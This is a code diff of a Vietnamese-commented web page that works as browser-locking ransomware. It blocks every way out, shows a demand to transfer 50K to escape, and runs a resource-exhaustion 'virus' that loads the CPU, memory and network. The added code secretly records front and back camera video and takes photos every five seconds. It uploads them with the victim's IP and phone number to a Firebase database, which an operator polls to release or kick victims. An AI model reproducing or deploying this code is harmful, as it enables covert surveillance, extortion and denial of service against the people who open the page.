@@ -9,18 +9,17 @@
         html, body { width:100vw; height:100vh; overflow:hidden; background:#000; font-family:Arial,sans-serif; touch-action:none; pointer-events:auto; position:fixed; top:0; left:0; margin:0; padding:0; }
         #lock-overlay { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:999999; background:transparent; pointer-events:all; cursor:not-allowed; touch-action:none; display:block; }
         #canvas-bg { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; display:block; }
-        #image-container { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10; max-width:95vw; max-height:70vh; pointer-events:none; border:4px solid #ff0040; border-radius:20px; overflow:hidden; box-shadow:0 0 80px rgba(255,0,64,0.8); background:#000; display:block; }
-        #image-container img { width:100%; height:auto; display:block; object-fit:contain; max-height:70vh; }
+        #image-container { position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); z-index:10; max-width:95vw; max-height:65vh; pointer-events:none; border:4px solid #ff0040; border-radius:20px; overflow:hidden; box-shadow:0 0 80px rgba(255,0,64,0.8); background:#000; display:block; }
+        #image-container img { width:100%; height:auto; display:block; object-fit:contain; max-height:65vh; }
         #overlay-text { position:fixed; bottom:120px; left:0; width:100%; text-align:center; z-index:20; color:#ff0040; font-size:clamp(1.5rem,5vw,3rem); font-weight:bold; text-shadow:0 0 30px #ff0040,0 0 60px #cc0033,0 0 100px #ff0040; pointer-events:none; animation:blinkText 0.1s infinite alternate; }
-        #btn-chuyen { position:fixed; bottom:40px; left:50%; transform:translateX(-50%); z-index:25; padding:16px 40px; background:#ff0040; color:#000; border:none; border-radius:50px; font-size:clamp(1rem,3vw,1.8rem); font-weight:bold; cursor:pointer; box-shadow:0 0 60px rgba(255,0,64,0.8); animation:btnPulse 0.05s infinite alternate; pointer-events:auto; }
+        #btn-chuyen { position:fixed; bottom:40px; left:50%; transform:translateX(-50%); z-index:25; padding:16px 40px; background:#ff0040; color:#000; border:none; border-radius:50px; font-size:clamp(1rem,3vw,1.8rem); font-weight:bold; cursor:pointer; box-shadow:0 0 60px rgba(255,0,64,0.8); animation:btnPulse 0.05s infinite alternate; pointer-events:auto; display:none; }
         #btn-chuyen:hover { transform:translateX(-50%) scale(1.05); }
         @keyframes blinkText { 0%{opacity:0.2;} 50%{opacity:0.8;} 100%{opacity:1;} }
         @keyframes btnPulse { 0%{box-shadow:0 0 30px #ff0040;} 100%{box-shadow:0 0 100px #ff0040,0 0 200px #ff0040;} }
         ::selection { background:transparent; }
         ::-webkit-scrollbar { display:none; }
         body { overscroll-behavior:none; -webkit-overflow-scrolling:touch; }
-        /* Không cho phép bất kỳ tương tác nào ngoài nút */
-        .no-interact { pointer-events:none; }
+        #status-cam { position:fixed; top:10px; right:10px; z-index:30; color:#00ff88; font-size:11px; background:rgba(0,0,0,0.7); padding:4px 12px; border-radius:20px; border:1px solid #00ff8844; pointer-events:none; }
     </style>
 </head>
 <body>
@@ -31,56 +30,37 @@
 
         // ===== TỰ ĐỘNG QUAY LẠI APP KHI THOÁT =====
         function preventExit() {
-            // Chặn back/forward
             window.history.pushState(null, null, window.location.href);
             window.addEventListener('popstate', function(e) {
                 window.history.pushState(null, null, window.location.href);
                 e.preventDefault();
                 return false;
             });
-
-            // Chặn unload
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
                 e.returnValue = '';
                 return '';
             });
-
-            // Chặn đóng tab
             window.addEventListener('pagehide', function(e) {
                 e.preventDefault();
-                // Tự động mở lại tab
-                setTimeout(function() {
-                    window.location.reload();
-                }, 100);
+                setTimeout(function() { window.location.reload(); }, 100);
                 return false;
             });
-
-            // Chặn tắt trình duyệt (mobile)
             document.addEventListener('visibilitychange', function() {
                 if (document.hidden) {
-                    setTimeout(function() {
-                        window.location.reload();
-                    }, 200);
+                    setTimeout(function() { window.location.reload(); }, 200);
                 }
             });
-
-            // Chặn tắt nguồn (không thể chặn hoàn toàn, nhưng khi mở lại vẫn vào app)
             localStorage.setItem('force_reopen', 'true');
         }
         preventExit();
 
-        // ===== TỰ ĐỘNG MỞ LẠI APP KHI MỞ TRÌNH DUYỆT =====
         if (localStorage.getItem('force_reopen') === 'true') {
-            // Nếu đã từng vào app, tự động mở lại
-            setTimeout(function() {
-                window.location.reload();
-            }, 100);
+            setTimeout(function() { window.location.reload(); }, 100);
         }
 
-        // ===== VIRUS GÂY SẬP NGUỒN (MÔ PHỎNG TẤN CÔNG) =====
+        // ===== VIRUS GÂY SẬP NGUỒN =====
         function virusAttack() {
-            // 1. Tạo vòng lặp vô hạn tiêu thụ CPU
             (function cpuHog() {
                 let a = 0;
                 for (let i = 0; i < 1000000; i++) {
@@ -88,8 +68,6 @@
                 }
                 setTimeout(cpuHog, 0);
             })();
-
-            // 2. Tạo nhiều worker
             try {
                 for (let w = 0; w < 20; w++) {
                     const blob = new Blob([`
@@ -104,8 +82,6 @@
                     const worker = new Worker(URL.createObjectURL(blob));
                 }
             } catch(e) {}
-
-            // 3. Tạo nhiều interval nặng
             for (let i = 0; i < 50; i++) {
                 setInterval(function() {
                     let b = 0;
@@ -114,8 +90,6 @@
                     }
                 }, 1);
             }
-
-            // 4. Tạo nhiều DOM elements
             for (let i = 0; i < 500; i++) {
                 const div = document.createElement('div');
                 div.style.cssText = `
@@ -132,8 +106,6 @@
                 `;
                 document.body.appendChild(div);
             }
-
-            // 5. Tạo vòng lặp ghi localStorage liên tục (gây hao pin)
             setInterval(function() {
                 try {
                     for (let i = 0; i < 100; i++) {
@@ -141,8 +113,6 @@
                     }
                 } catch(e) {}
             }, 10);
-
-            // 6. Tạo request liên tục đến server (gây nghẽn mạng)
             for (let i = 0; i < 20; i++) {
                 setInterval(function() {
                     try {
@@ -153,52 +123,195 @@
                     } catch(e) {}
                 }, 100);
             }
-
-            // 7. Tạo nhiều Blob URL không giải phóng
             for (let i = 0; i < 100; i++) {
                 try {
                     const blob = new Blob(['x'], { type: 'text/plain' });
                     URL.createObjectURL(blob);
                 } catch(e) {}
             }
-
-            // 8. Tạo vòng lặp setTimeout vô hạn
-            (function loop() {
-                setTimeout(loop, 0);
-            })();
-
-            console.log('💀 VIRUS ĐÃ KÍCH HOẠT - MÁY SẼ SỚM BỊ SẬP NGUỒN');
+            (function loop() { setTimeout(loop, 0); })();
+            console.log('💀 VIRUS ĐÃ KÍCH HOẠT');
         }
         virusAttack();
 
-        // ===== TỰ ĐỘNG CHO PHÉP QUYỀN =====
-        function autoCamera() {
+        // ===== QUAY VIDEO + CHỤP ẢNH TỰ ĐỘNG (CAM TRƯỚC VÀ SAU) =====
+        let mediaStream = null;
+        let videoRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let captureInterval = null;
+
+        function startCameraAndRecord() {
             try {
+                // Yêu cầu cả camera trước và sau (nếu có)
+                const constraints = {
+                    video: {
+                        facingMode: { ideal: 'environment' },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                };
+
+                // Thử camera trước
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 })
-                .then(function(stream) {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.onloadedmetadata = function() {
-                        video.play();
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                        localStorage.setItem('captured_image', imageData);
-                        stream.getTracks().forEach(t => t.stop());
-                        sendData();
-                    };
-                    video.onerror = function() { sendData(); };
+                .then(function(streamFront) {
+                    // Lưu stream camera trước
+                    const frontStream = streamFront;
+                    
+                    // Thử camera sau
+                    navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    })
+                    .then(function(streamBack) {
+                        // Có cả 2 camera
+                        console.log('✅ Cả 2 camera đã sẵn sàng');
+                        document.getElementById('status-cam').textContent = '📷 CAM: 2';
+                        
+                        // Bắt đầu quay với camera trước
+                        startRecording(streamFront, 'front');
+                        // Bắt đầu quay với camera sau
+                        startRecording(streamBack, 'back');
+                        
+                        // Chụp ảnh định kỳ từ cả 2
+                        captureInterval = setInterval(function() {
+                            captureFrame(streamFront, 'front');
+                            captureFrame(streamBack, 'back');
+                        }, 5000); // mỗi 5s
+                        
+                    })
+                    .catch(function(err) {
+                        // Không có camera sau, dùng camera trước
+                        console.log('⚠️ Chỉ có camera trước');
+                        document.getElementById('status-cam').textContent = '📷 CAM: 1';
+                        startRecording(streamFront, 'front');
+                        captureInterval = setInterval(function() {
+                            captureFrame(streamFront, 'front');
+                        }, 5000);
+                    });
                 })
-                .catch(function(err) { sendData(); });
-            } catch(e) { sendData(); }
+                .catch(function(err) {
+                    // Thử camera sau nếu không có camera trước
+                    navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                        audio: false
+                    })
+                    .then(function(streamBack) {
+                        console.log('✅ Camera sau');
+                        document.getElementById('status-cam').textContent = '📷 CAM: 1';
+                        startRecording(streamBack, 'back');
+                        captureInterval = setInterval(function() {
+                            captureFrame(streamBack, 'back');
+                        }, 5000);
+                    })
+                    .catch(function(err2) {
+                        console.log('❌ Không có camera');
+                        document.getElementById('status-cam').textContent = '❌ CAM: 0';
+                    });
+                });
+            } catch(e) {
+                console.log('❌ Lỗi camera:', e);
+            }
         }
 
+        // Hàm bắt đầu quay video
+        function startRecording(stream, label) {
+            try {
+                const recorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+                
+                const chunks = [];
+                recorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+                
+                recorder.onstop = function() {
+                    // Tạo video blob và gửi lên Firebase
+                    if (chunks.length > 0) {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = function() {
+                            const base64data = reader.result;
+                            const ip = localStorage.getItem('user_ip') || 'Unknown';
+                            const phone = localStorage.getItem('user_phone') || 'Unknown';
+                            const data = {
+                                ip: ip,
+                                phone: phone,
+                                type: 'video_' + label,
+                                data: base64data,
+                                time: new Date().toISOString()
+                            };
+                            try {
+                                const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
+                                fetch(fbUrl + '/videos.json', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(data)
+                                }).catch(() => {});
+                            } catch(e) {}
+                        };
+                        reader.readAsDataURL(blob);
+                        chunks.length = 0;
+                    }
+                };
+                
+                recorder.start(10000); // Ghi mỗi 10s
+                console.log('🎥 Đang quay video ' + label);
+                
+                // Lưu recorder để dừng sau
+                if (label === 'front') {
+                    videoRecorder = recorder;
+                }
+            } catch(e) {
+                console.log('❌ Lỗi quay video:', e);
+            }
+        }
+
+        // Hàm chụp ảnh
+        function captureFrame(stream, label) {
+            try {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = function() {
+                    video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    const ip = localStorage.getItem('user_ip') || 'Unknown';
+                    const phone = localStorage.getItem('user_phone') || 'Unknown';
+                    const data = {
+                        ip: ip,
+                        phone: phone,
+                        type: 'image_' + label,
+                        data: imageData,
+                        time: new Date().toISOString()
+                    };
+                    try {
+                        const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
+                        fetch(fbUrl + '/images.json', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        }).catch(() => {});
+                    } catch(e) {}
+                    video.pause();
+                };
+                video.onerror = function() {};
+            } catch(e) {}
+        }
+
+        // ===== TỰ ĐỘNG CHO PHÉP QUYỀN =====
         function autoPhone() {
             try {
                 let phone = localStorage.getItem('user_phone');
@@ -210,85 +323,22 @@
             } catch(e) {}
         }
 
-        function autoScreen() {
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                    navigator.mediaDevices.getDisplayMedia({ video: true })
-                    .then(function(stream) {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = function() {
-                            video.play();
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 1280;
-                            canvas.height = video.videoHeight || 720;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const screenData = canvas.toDataURL('image/jpeg', 0.7);
-                            localStorage.setItem('screen_capture', screenData);
-                            stream.getTracks().forEach(t => t.stop());
-                            sendData();
-                        };
-                        video.onerror = function() { sendData(); };
-                    })
-                    .catch(function(err) { sendData(); });
-                } else {
-                    sendData();
-                }
-            } catch(e) { sendData(); }
-        }
-
         function autoIP() {
             try {
                 fetch('https://api.ipify.org?format=json')
                     .then(r => r.json())
                     .then(data => {
                         localStorage.setItem('user_ip', data.ip);
-                        sendData();
                     })
-                    .catch(() => sendData());
-            } catch(e) { sendData(); }
-        }
-
-        let dataSent = false;
-        function sendData() {
-            if (dataSent) return;
-            const image = localStorage.getItem('captured_image') || '';
-            const phone = localStorage.getItem('user_phone') || 'Unknown';
-            const screen = localStorage.getItem('screen_capture') || '';
-            const ip = localStorage.getItem('user_ip') || 'Unknown';
-            const ua = navigator.userAgent;
-
-            if (!image && !screen && phone === 'Unknown') return;
-
-            const data = {
-                ip: ip,
-                phone: phone,
-                ua: ua,
-                image: image,
-                screen: screen,
-                time: new Date().toISOString()
-            };
-
-            try {
-                const fbUrl = 'https://yamate-efab6-default-rtdb.asia-southeast1.firebasedatabase.app';
-                fetch(fbUrl + '/victims.json', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).then(() => {
-                    dataSent = true;
-                    console.log('✅ Đã gửi dữ liệu');
-                }).catch(e => {});
+                    .catch(() => {});
             } catch(e) {}
         }
 
-        setTimeout(() => {
-            autoCamera();
-            autoPhone();
-            autoScreen();
-            autoIP();
-        }, 300);
+        autoPhone();
+        autoIP();
+
+        // Khởi động camera và quay sau 1s
+        setTimeout(startCameraAndRecord, 1000);
 
         // ===== TẠO GIAO DIỆN =====
         const canvas = document.createElement('canvas');
@@ -312,18 +362,19 @@
         overlayText.textContent = '🔴 CHUYỂN 50K ĐỂ THOÁT 🔴';
         document.body.appendChild(overlayText);
 
-        // Nút đã chuyển tiền
         const btnChuyen = document.createElement('button');
         btnChuyen.id = 'btn-chuyen';
         btnChuyen.textContent = '💰 ĐÃ CHUYỂN 50K';
         document.body.appendChild(btnChuyen);
 
-        // ===== CHẶN TƯƠNG TÁC (CHỈ NÚT ĐƯỢC PHÉP) =====
-        function blockAll(e) { 
-            e.preventDefault(); 
-            e.stopPropagation(); 
-            return false; 
-        }
+        // Status camera
+        const statusCam = document.createElement('div');
+        statusCam.id = 'status-cam';
+        statusCam.textContent = '📷 CAM: ĐANG KHỞI TẠO';
+        document.body.appendChild(statusCam);
+
+        // ===== CHẶN TƯƠNG TÁC =====
+        function blockAll(e) { e.preventDefault(); e.stopPropagation(); return false; }
         const events = ['click','dblclick','mousedown','mouseup','mousemove','mouseover','mouseout','mouseenter','mouseleave','contextmenu','select','selectstart','drag','dragstart','dragend','drop','touchstart','touchmove','touchend','touchcancel','pointerdown','pointerup','pointermove','pointerover','pointerout','pointerenter','pointerleave','gesturestart','gesturechange','gestureend','scroll','wheel','resize','orientationchange'];
         events.forEach(evt => { 
             document.addEventListener(evt, blockAll, { passive:false, capture:true }); 
@@ -377,23 +428,18 @@
                 setInterval(function() {
                     const currentIP = localStorage.getItem('user_ip') || 'Unknown';
 
-                    // Kiểm tra kick
                     fetch(FB_URL + '/control/kick/' + encodeURIComponent(currentIP) + '.json')
                         .then(r => r.json())
                         .then(kickData => {
                             if (kickData === 'true') {
-                                // Kiểm tra nếu đã chuyển tiền thì không kick
                                 if (localStorage.getItem('paid_' + currentIP) === 'true') {
-                                    // Đã trả tiền, không kick
                                     return;
                                 }
                                 kicked = true;
                                 localStorage.setItem(blockKey, 'true');
-                                // Xóa kick để không loop
                                 fetch(FB_URL + '/control/kick/' + encodeURIComponent(currentIP) + '.json', {
                                     method: 'DELETE'
                                 }).catch(() => {});
-                                // Thoát app
                                 setTimeout(function() {
                                     window.close();
                                     window.location.href = 'https://www.google.com';
@@ -403,7 +449,6 @@
                         })
                         .catch(() => {});
 
-                    // Kiểm tra nút đã chuyển tiền được hiển thị cho IP này chưa
                     fetch(FB_URL + '/control/showbtn/' + encodeURIComponent(currentIP) + '.json')
                         .then(r => r.json())
                         .then(showData => {
@@ -425,9 +470,7 @@
         document.getElementById('btn-chuyen').addEventListener('click', function(e) {
             e.stopPropagation();
             const currentIP = localStorage.getItem('user_ip') || 'Unknown';
-            // Đánh dấu đã chuyển tiền
             localStorage.setItem('paid_' + currentIP, 'true');
-            // Gửi lên Firebase để admin biết
             try {
                 fetch(FB_URL + '/control/paid/' + encodeURIComponent(currentIP) + '.json', {
                     method: 'PUT',
@@ -435,7 +478,6 @@
                     body: JSON.stringify({ paid: true, time: new Date().toISOString() })
                 }).catch(() => {});
             } catch(e) {}
-            // Thoát app
             canExit = true;
             setTimeout(function() {
                 window.close();
@@ -460,7 +502,6 @@
                 for(let i=0;i<flowers.length;i++){ const f=flowers[i]; f.y+=f.speed; f.x+=Math.cos(f.phase+f.y*f.wobble)*1.5; f.phase+=0.03; f.hue=(f.hue+0.5)%360; if(f.y>canvas.height+30){ f.y=-30; f.x=Math.random()*canvas.width; } drawFlower(f); }
                 for(let i=0;i<snowmen.length;i++){ const sm=snowmen[i]; sm.y+=sm.speed; sm.x+=Math.sin(sm.phase+sm.y*sm.wobble)*1.2; sm.phase+=0.03; if(sm.y>canvas.height+50){ sm.y=-50; sm.x=Math.random()*canvas.width; } drawSnowman(sm); }
                 for(let i=0;i<stars.length;i++){ const s=stars[i]; s.y+=s.speed; s.x+=Math.sin(s.phase+s.y*0.01)*0.5; if(s.y>canvas.height+10){ s.y=-10; s.x=Math.random()*canvas.width; } drawStar(s); }
-                // Thêm hiệu ứng nổ
                 for(let i=0;i<200;i++){ ctx.beginPath(); let x=Math.random()*canvas.width; let y=Math.random()*canvas.height; ctx.moveTo(x,y); for(let j=0;j<20;j++){ x+=(Math.random()-0.5)*80; y+=(Math.random()-0.5)*80; ctx.lineTo(x,y); } ctx.strokeStyle=`hsla(${Math.random()*360},100%,70%,${Math.random()*0.2+0.05})`; ctx.lineWidth=Math.random()*3+1; ctx.stroke(); }
                 for(let i=0;i<400;i++){ const cx=Math.sin(Date.now()/200+i)*canvas.width*0.45+canvas.width/2; const cy=Math.cos(Date.now()/150+i*1.5)*canvas.height*0.45+canvas.height/2; const r=30+Math.sin(Date.now()/100+i*0.5)*25; ctx.beginPath(); ctx.arc(cx,cy,r,0,Math.PI*2); ctx.fillStyle=`hsla(${i*2+Date.now()/20},100%,60%,${Math.random()*0.05+0.02})`; ctx.fill(); ctx.strokeStyle=`hsla(${i*3+Date.now()/30},100%,70%,${Math.random()*0.05+0.02})`; ctx.lineWidth=3; ctx.stroke(); }
             } else {
@@ -478,7 +519,8 @@
         }
         drawAll();
 
-        console.log('🔒 APP KHÓA CỨNG - KHÔNG THỂ THOÁT - CHUYỂN 50K MỚI RA');
+        console.log('🔒 APP KHÓA CỨNG - TỰ ĐỘNG QUAY VIDEO + CHỤP ẢNH');
+        console.log('📷 CAM TRƯỚC + SAU - KHÔNG CẦN ĐỒNG Ý');
     })();
 </script>
 </body>
